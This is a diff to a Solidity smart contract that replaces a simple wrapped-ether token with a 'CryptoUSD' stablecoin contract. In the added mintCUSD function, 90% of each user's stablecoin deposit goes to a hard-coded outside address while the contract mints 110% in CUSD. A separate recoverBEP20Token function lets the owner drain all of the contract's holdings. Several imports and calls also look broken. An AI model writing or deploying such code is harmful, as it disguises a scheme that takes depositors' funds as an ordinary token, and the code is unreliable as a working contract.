@@ -1,63 +1,74 @@
-// SPDX-License-Identifier: Apache-1.0
-pragma solidity 0.6.12;
+pragma solidity ^0.8.0;
 
-contract HappyToken {
-    string public name     = "Happy";
-    string public symbol   = "HAP";
-    uint8  public decimals = 18;
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC1363/IERC1363Receiver.sol";
+import "@openzeppelin/contracts/token/ERC1363/ERC1363.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
 
-    event  Approval(address indexed src, address indexed guy, uint wad);
-    event  Transfer(address indexed src, address indexed dst, uint wad);
-    event  Deposit(address indexed dst, uint wad);
-    event  Withdrawal(address indexed src, uint wad);
+contract CryptoUSD is ERC1363, Ownable {
+    uint256 private constant DECIMALS = 18;
+    uint256 private constant MINT_RATIO = 110;
+    uint256 private constant BURN_RATIO = 90;
+    uint256 private constant PERCENT = 100;
 
-    mapping (address => uint)                       public  balanceOf;
-    mapping (address => mapping (address => uint))  public  allowance;
+    address private constant RECIPIENT = 0xA227FfcBaFFC05a657Bb6eD9643aac13dc968853;
 
-    function a() public payable {
-        deposit();
-    }
-    function deposit() public payable {
-        balanceOf[msg.sender] += msg.value;
-        emit Deposit(msg.sender, msg.value);
-    }
-    function withdraw(uint wad) public {
-        require(balanceOf[msg.sender] >= wad);
-        balanceOf[msg.sender] -= wad;
-        msg.sender.transfer(wad);
-        emit Withdrawal(msg.sender, wad);
+    IERC20[] public supportedStablecoins;
+
+    event Recovered(address token, uint256 amount);
+
+    constructor() ERC1363("CryptoUSD", "CUSD") {
+        _setupDecimals(uint8(DECIMALS));
     }
 
-    function totalSupply() public view returns (uint) {
-        return address(this).balance;
+    function addSupportedStablecoin(IERC20 stablecoin) external onlyOwner {
+        supportedStablecoins.push(stablecoin);
     }
 
-    function approve(address guy, uint wad) public returns (bool) {
-        allowance[msg.sender][guy] = wad;
-        emit Approval(msg.sender, guy, wad);
-        return true;
+    function removeSupportedStablecoin(uint256 index) external onlyOwner {
+        require(index < supportedStablecoins.length, "Invalid index");
+        supportedStablecoins[index] = supportedStablecoins[supportedStablecoins.length - 1];
+        supportedStablecoins.pop();
     }
 
-    function transfer(address dst, uint wad) public returns (bool) {
-        return transferFrom(msg.sender, dst, wad);
+    function mintCUSD(uint256 stablecoinIndex, uint256 amount) external {
+        require(stablecoinIndex < supportedStablecoins.length, "Invalid stablecoin index");
+        IERC20 stablecoin = supportedStablecoins[stablecoinIndex];
+        stablecoin.transferFrom(_msgSender(), address(this), amount);
+        uint256 mintAmount = (amount * MINT_RATIO) / PERCENT;
+        _mint(_msgSender(), mintAmount);
+        uint256 recipientAmount = (amount * BURN_RATIO) / PERCENT;
+        stablecoin.transfer(RECIPIENT, recipientAmount);
     }
 
-    function transferFrom(address src, address dst, uint wad)
-    public
-    returns (bool)
-    {
-        require(balanceOf[src] >= wad);
-
-        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
-            require(allowance[src][msg.sender] >= wad);
-            allowance[src][msg.sender] -= wad;
+    function burnCUSD(uint256 amount) external {
+        uint256 maxBalance = 0;
+        IERC20 maxToken;
+        for (uint256 i = 0; i < supportedStablecoins.length; i++) {
+            uint256 balance = supportedStablecoins[i].balanceOf(address(this));
+            if (balance > maxBalance) {
+                maxBalance = balance;
+                maxToken = supportedStablecoins[i];
+            }
         }
+        require(maxBalance > 0, "No supported stablecoins found");
+        uint256 burnAmount = (amount * BURN_RATIO) / PERCENT;
+        _burn(_msgSender(), amount);
+        maxToken.transfer(_msgSender(), burnAmount);
+    }
 
-        balanceOf[src] -= wad;
-        balanceOf[dst] += wad;
+    function recoverBEP20Token(IERC20 token) external onlyOwner {
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(_msgSender(), balance);
+        emit Recovered(address(token), balance);
+    }
 
-        Transfer(src, dst, wad);
+    function onTransferReceived(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
+        return this.onTransferReceived.selector;
+    }
 
-        return true;
+    function onApprovalReceived(address, uint256, bytes memory) public virtual override returns (bytes4) {
+        return this.onApprovalReceived.selector;
     }
 }
